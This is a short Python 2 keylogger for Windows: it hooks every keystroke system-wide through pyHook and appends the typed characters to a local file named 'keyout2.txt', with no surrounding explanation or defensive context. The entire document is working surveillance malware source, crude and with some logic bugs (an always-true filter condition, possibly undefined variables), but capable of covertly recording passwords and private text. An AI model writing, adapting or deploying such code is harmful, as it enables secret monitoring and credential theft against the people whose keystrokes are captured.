import win32api
import sys
import pythoncom, pyHook

buffer = ''

def OnKeyboardEvent(event):
    if event.Ascii == 5: sys.exit()
    if event.Ascii != 0 or event.Ascii != 8:
        f = open('keyout2.txt','a')
        keylogs = chr(event.Ascii)
    if event.Ascii == 13:
        keylogs += '\n'
    print keylogs
    f.write(keylogs)
    f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
